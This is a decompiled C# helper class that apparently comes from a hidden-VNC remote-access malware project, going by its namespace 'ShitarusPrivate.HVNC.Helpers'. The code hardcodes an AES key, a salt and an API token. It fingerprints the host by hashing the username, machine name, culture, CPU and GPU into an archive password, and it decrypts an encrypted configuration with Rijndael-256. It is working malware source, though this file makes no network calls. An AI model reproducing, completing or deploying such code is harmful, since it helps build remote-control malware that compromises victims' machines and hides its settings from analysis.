using System;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

namespace ShitarusPrivate.HVNC.Helpers
{
    internal sealed class StringsCrypt
    {
        [Serializable]
        [CompilerGenerated]
        private sealed class __c
        {
            public static readonly __c __9 = new __c();

            public static Func<byte, string> __9__4_0;

            internal string _GenerateRandomData_b__4_0(byte ba)
            {
                byte b = ba;
                return b.ToString("x2");
            }
        }

        public static string ArchivePassword = GenerateRandomData();

        private byte[] SaltBytes = Encoding.Default.GetBytes("f3o3K-11=G-N7VJtozOWRr=(tNZBfK+bS7Fy");

        private byte[] CryptKey = Encoding.Default.GetBytes(";&KF!M!h8^iT:<)a?~mXeN*~o?gN[v@rQ=B");

        private byte[] ApiKey = Encoding.Default.GetBytes("?token=0429cbf2316b8e33");

        public static string GenerateRandomData(string sd = "0")
        {
            string text = sd;
            if (sd == "0")
            {
                DateTime dateTime = DateTime.Parse(SystemInfo.Datenow);
                text = ((DateTimeOffset)dateTime).Ticks.ToString();
            }
            string s = text + "-" + SystemInfo.Username + "-" + SystemInfo.Compname + "-" + SystemInfo.Culture + "-" + SystemInfo.GetCpuName() + "-" + SystemInfo.GetGpuName();
            using MD5 mD = MD5.Create();
            return string.Join("", mD.ComputeHash(Encoding.UTF8.GetBytes(s)).Select(__c.__9__4_0 ?? (__c.__9__4_0 = __c.__9._GenerateRandomData_b__4_0)));
        }

        public static string Decrypt(byte[] bytesToBeDecrypted)
        {
            byte[] bytes = Encoding.Default.GetBytes(";&KF!M!h8^iT:<)a?~mXeN*~o?gN[v@rQ=B");
            byte[] bytes2 = Encoding.Default.GetBytes("f3o3K-11=G-N7VJtozOWRr=(tNZBfK+bS7Fy");
            byte[] bytes3;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using RijndaelManaged rijndaelManaged = new RijndaelManaged();
                rijndaelManaged.KeySize = 256;
                rijndaelManaged.BlockSize = 128;
                Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, bytes2, 1000);
                rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
                rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
                rijndaelManaged.Mode = CipherMode.CBC;
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                    cryptoStream.Close();
                }
                bytes3 = memoryStream.ToArray();
            }
            return Encoding.UTF8.GetString(bytes3);
        }

        public static string DecryptConfig(string value)
        {
            if (string.IsNullOrEmpty(value))
            {
                return "";
            }
            if (!value.StartsWith("ENCRYPTED:"))
            {
                return value;
            }
            return Decrypt(Convert.FromBase64String(value.Replace("ENCRYPTED:", "")));
        }
    }
}
